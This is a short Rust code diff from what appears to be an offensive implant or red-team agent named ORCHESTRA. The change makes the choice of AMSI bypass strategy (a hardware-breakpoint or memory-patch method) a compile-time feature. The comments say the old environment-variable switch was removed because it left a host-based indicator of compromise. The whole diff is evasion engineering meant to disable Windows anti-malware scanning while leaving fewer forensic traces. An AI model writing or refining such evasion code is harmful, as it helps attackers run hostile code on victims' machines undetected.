@@ -239,16 +239,20 @@ impl Agent {
             // AMSI bypass: choose HWBP OR memory patch, never both (H-11).
             // The memory patch overwrites the bytes that HWBP set breakpoints on,
             // so running both makes the HWBP path silently no-op.
-            // Default: HWBP (stealthier, no .text modification).  Override with
-            // ORCHESTRA_AMSI_HWBP=0 to use the memory-patch path instead.
-            let use_hwbp = std::env::var("ORCHESTRA_AMSI_HWBP")
-                .map(|v| !(v == "0" || v.eq_ignore_ascii_case("false")))
-                .unwrap_or(true);
-            if use_hwbp {
+            //
+            // Strategy is selected at compile time via the `hwbp-amsi` feature:
+            //   - Default (no feature): memory-patch approach (no env-var trace).
+            //   - hwbp-amsi feature:     hardware-breakpoint VEH approach.
+            // The old ORCHESTRA_AMSI_HWBP env-var check was a host-based IOC
+            // and has been removed.
+            #[cfg(feature = "hwbp-amsi")]
+            {
                 unsafe {
                     crate::evasion::patch_amsi();
                 }
-            } else {
+            }
+            #[cfg(not(feature = "hwbp-amsi"))]
+            {
                 crate::amsi_defense::orchestrate_layers();
             }
             crate::amsi_defense::verify_bypass();
